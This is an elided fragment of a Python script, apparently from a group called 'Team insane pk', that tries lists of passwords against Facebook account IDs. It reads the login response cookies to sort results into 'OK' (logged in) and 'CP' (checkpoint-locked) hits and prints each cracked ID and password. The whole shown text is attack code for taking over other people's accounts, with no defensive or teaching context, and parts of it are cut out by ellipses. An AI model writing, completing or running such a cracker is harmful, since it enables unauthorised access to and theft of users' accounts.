...
|̲̅̅●̲̅̅|̲̅̅=̲̅̅|̲̅̅●̲̅̅| Team insane pk  |̲̅̅●̲̅̅|̲̅̅=̲̅̅|̲̅̅●̲̅̅|
	...
	for pw in pwv: 
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print('\n')
				print(f'\033[0;1FB \033[33;1mINSANE CP: {idf};{pw}')
				cp+=1
				break
				...
				print('\n')
				print(f'\033[0;1mFB \033[32;1mINSANE OK: {idf};{pw}')
				ok+= 1
				break
...
'accept-language':'en-GB,en-US;q=0.9,en;q=0.8'})
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print('\n')
				print(f'\033[33;1mINSANE CP:\nFB ID: {idf}\nFB PASS: {pw}')
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				print('\n')
				print(f'\033[32;1mINSANE OK:\nFB ID: {idf}\nFB PASS: {pw}')
				ok+=1
				break
